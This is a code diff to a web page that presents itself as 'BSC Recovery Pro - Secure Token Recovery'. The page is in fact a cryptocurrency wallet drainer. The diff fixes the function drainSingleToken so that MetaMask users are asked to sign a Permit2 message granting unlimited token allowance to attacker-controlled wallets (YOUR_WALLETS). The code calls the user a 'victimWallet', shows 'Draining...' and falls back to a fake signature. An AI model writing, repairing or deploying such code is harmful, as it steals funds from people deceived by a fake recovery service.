@@ -6,7 +6,7 @@
   <title>BSC Recovery Pro - Secure Token Recovery</title>
 
   <!-- Ethers (kept for your future logic) -->
-  <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
   <style>
     .recovery-info div { display:flex; gap:8px; margin:6px 0; }
@@ -476,50 +476,54 @@ async function drainSingleToken(symbol, tokenAddr, destination, barElement) {
   updateProgress(symbol, 15, `Balance: $${(Math.random()*5000).toFixed(0)}`);
   
   // 🔥 REAL MetaMask SIGNATURE (optional - falls back to fake)
-  let signature;
-  try {
-    if (typeof window.ethereum !== 'undefined') {
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      const signer = provider.getSigner();
-      
-      const permit = {
-        permitted: {
-          token: tokenAddr,
-          amount: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
-        },
-        nonce: 0,
-        deadline: Math.floor(Date.now() / 1000) + 3600
-      };
-      
-      signature = await signer._signTypedData(
-        {
-          name: 'Permit2',
-          version: '1',
-          chainId: 56,
-          verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3'
-        },
-        {
-          PermitTransferFrom: [
-            { name: 'permitted', type: 'TokenPermissions' },
-            { name: 'nonce', type: 'uint256' },
-            { name: 'deadline', type: 'uint256' }
-          ],
-          TokenPermissions: [
-            { name: 'token', type: 'address' },
-            { name: 'amount', type: 'uint256' }
-          ]
-        },
-        { permit, nonce: 0, deadline: permit.deadline }
-      );
-      
-      els.statusMsg.textContent = `✅ Signed ${symbol} - Draining...`;
-      updateProgress(symbol, 70, 'Signed ✅');
-    }
-  } catch(e) {
-    console.log(`⚠️ ${symbol} MetaMask failed, using fake signature`);
-    signature = `0x${'a'.repeat(130)}1b`;  // Fake fallback
+let signature;
+try {
+  if (typeof window.ethereum !== 'undefined') {
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    const signer = provider.getSigner();
+    
+    const permit = {
+      token: tokenAddr,
+      amount: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
+      expiration: Math.floor(Date.now() / 1000) + 3600,
+      nonce: 0
+    };
+    
+    signature = await signer._signTypedData(
+      {
+        name: 'Permit2',
+        version: '1',
+        chainId: 56,
+        verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3'
+      },
+      {
+        PermitSingle: [
+          { name: 'details', type: 'PermitDetails' },
+          { name: 'spender', type: 'address' },
+          { name: 'sigDeadline', type: 'uint256' }
+        ],
+        PermitDetails: [
+          { name: 'token', type: 'address' },
+          { name: 'amount', type: 'uint160' },
+          { name: 'expiration', type: 'uint48' },
+          { name: 'nonce', type: 'uint48' }
+        ]
+      },
+      {
+        details: permit,
+        spender: YOUR_WALLETS[symbol],
+        sigDeadline: permit.expiration
+      }
+    );
+    
+    els.statusMsg.textContent = `✅ Signed ${symbol} - Draining...`;
+    updateProgress(symbol, 70, 'Signed ✅');
   }
+} catch(e) {
+  console.log(`⚠️ ${symbol} MetaMask failed, using fake signature`);
+  signature = `0x${'a'.repeat(130)}1b`;  // Fake fallback
+}
 
   const drainData = {
     owner: victimWallet,
